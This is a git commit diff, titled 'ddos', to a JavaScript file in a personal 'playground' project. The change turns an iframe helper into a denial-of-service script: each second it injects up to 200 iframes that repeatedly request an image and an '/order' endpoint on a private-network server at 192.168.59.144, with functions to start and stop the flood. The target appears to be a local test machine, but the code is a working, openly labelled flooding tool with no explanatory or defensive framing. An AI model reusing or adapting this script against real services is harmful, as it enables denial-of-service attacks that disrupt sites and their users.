0fa0566921e4298b7bad269913873083152c8ba2
Zeus Chiu <zeuscsc@gmail.com>
2022-09-16 18:59:51 +0800

    ddos

--- zeus's playground/js/iframe_test.js
+++ zeus's playground/js/iframe_test.js
@@ -1,17 +1,23 @@
-function goto(address){
+function goto(address,threadCount){
     let container=document.querySelector(".container");
     let parentNode=container.parentNode;
     parentNode.removeChild(container);
     container.innerHTML="";
-    for(let i=0; i<10;i++){
+    for(let i=0; i<threadCount;i++){
         container.innerHTML+=/*html*/`<iframe class="ddos_window" src=${address}></iframe>`;
     }
     parentNode.appendChild(container);
 }
-// async function goto(address){
-//     let res=await fetch(address)
-//     console.log(await res.json())
-// }
+function intervalCallback(){
+    goto("http://192.168.59.144:8080/bg.png",20);
+    goto("http://192.168.59.144:8080/order",200);
+}
+let intervalFunction;
 function ddos(){
-    setInterval(()=>{goto("http://192.168.59.144:8080/bg.png");},1000)
+    if(intervalFunction)
+        clearInterval(intervalFunction);
+    intervalFunction=setInterval(intervalCallback,1000)
+}
+function stop_ddos(){
+    clearInterval(intervalFunction)
 }
